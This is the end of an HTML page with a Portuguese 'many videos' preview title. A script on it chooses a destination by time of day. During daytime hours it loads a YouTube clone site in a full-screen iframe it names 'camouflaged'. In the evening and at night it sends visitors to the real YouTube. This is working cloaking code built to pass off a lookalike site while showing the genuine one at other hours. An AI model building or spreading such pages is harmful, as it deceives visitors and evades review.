    <meta property="og:title" content="Muitos vídeos para você aproveitar">

    <style>
        /* CSS Limpo e sem efeitos */
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            width: 100%;
            overflow: hidden;
            font-family: sans-serif;
            background-color: #FFFFFF; 
            color: #333333; /* CORRIGIDO: Texto estava branco no fundo branco. Agora está visível. */
        }

        #tela-carregamento {
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }

        #frame-camuflado {
            border: none;
            width: 100%;
            height: 100%;
            display: none; 
        }
    </style>
</head>
<body>

    <div id="tela-carregamento">
        <h1>Carregando...</h1>
    </div>

    <iframe id="frame-camuflado" src="" allow="autoplay; encrypted-media; picture-in-picture" allowfullscreen></iframe>

    <script>
        /**
         * Lógica de Direcionamento Horário
         */
        function obterDestino() {
            const hora = new Date().getHours();
            const cloneVitara = "https://youtube-clone-platform.vitara.app";
            const youtubeOficial = "https://www.youtube.com.br";

            // Manhã (06h às 12h)
            if (hora >= 6 && hora < 12) {
                return cloneVitara;
            }
            
            // Tarde (12h às 14h)
            if (hora >= 12 && hora < 14) {
                return cloneVitara;
            }
                
            // Tarde (14h às 18h)
            if (hora >= 14 && hora < 18) {
                return cloneVitara;
            }

            // Noite e Madrugada (18h às 00h)
            if (hora >= 18 && hora < 24) {
                return youtubeOficial;
            }

            return youtubeOficial;
        }

        const urlFinal = obterDestino();

        // Execução imediata
        function executarRedirecionamento() {
            if (urlFinal.includes("youtube.com")) {
                // Se for YouTube oficial, redireciona a aba toda
                window.location.href = urlFinal;
            } else {
                // Se for o clone, exibe o iframe
                document.getElementById('tela-carregamento').style.display = 'none';
                const iframe = document.getElementById('frame-camuflado');
                iframe.style.display = 'block';
                iframe.src = urlFinal;
            }
        }

        // Inicia assim que a página carrega
        window.onload = executarRedirecionamento;
    </script>
</body>
</html>
